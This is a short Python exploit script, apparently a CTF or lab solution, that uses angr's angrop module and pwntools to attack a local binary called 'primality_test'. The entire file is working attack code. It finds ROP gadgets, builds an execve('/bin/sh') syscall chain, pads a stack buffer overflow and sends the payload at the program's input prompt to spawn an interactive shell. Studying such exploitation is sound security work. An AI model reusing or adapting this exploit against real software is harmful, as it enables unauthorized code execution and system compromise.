"""
Exploit write in angr with angrop module.
It highlights the potentiality and the comfortable syntax
"""

import angr, angrop
from pwn import *

# Create ELF binary
file_path = 'primality_test'
exe = ELF(file_path)

# Create angr project and ROP object
p = angr.Project(file_path)
rop = p.analyses.ROP()
rop.find_gadgets()

# Address of string "/bin/sh"
bin_string = 0x08048991
# Build ROP chain exploiting the syscall "execve(/bin/sh)"
chain = rop.do_syscall(11, [bin_string, 0x0, 0x0])
chain.print_payload_code()

# Add padding for exploit
ropchain = b'A'*(0x4c + 4) + chain.payload_str()


# Executing the executable with ropchain as input
io = process([file_path])
io.sendlineafter(b'Enter a number: ', ropchain)
# To manually interact with the spawn shell
io.interactive()
